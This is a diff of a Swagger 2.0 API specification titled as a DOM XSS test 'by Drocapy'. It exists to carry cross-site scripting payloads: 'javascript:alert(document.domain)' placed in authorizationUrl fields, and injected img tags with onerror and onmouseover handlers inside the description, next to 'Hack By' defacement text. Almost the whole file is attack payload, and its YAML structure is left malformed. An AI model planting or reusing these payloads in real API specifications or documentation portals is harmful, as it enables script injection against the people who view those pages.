@@ -1,12 +1,11 @@
 swagger: '2.0'
+authorizationUrl: javascript:alert(document.domain)//
 securityDefinitions:
-  a:
-    type: oauth2
     authorizationUrl: javascript:alert(document.domain)//
 info:
   version: "1.0.0"
   title: DOM XSS imge Test by Drocapy
-  description: Hack By Drocapy '><img src=x onmouseover=prompt(2); <img src=x onerror=prompt(3)>;  ><img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onmouseover="alert(55)" onmouseover="alert(77)">
+  description: Hack By Drocapy  ><img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onmouseover="alert(55)" onmouseover="alert(77)">
   authorizationUrl: javascript:alert(document.domain)//
 paths:
   /Drocapy:
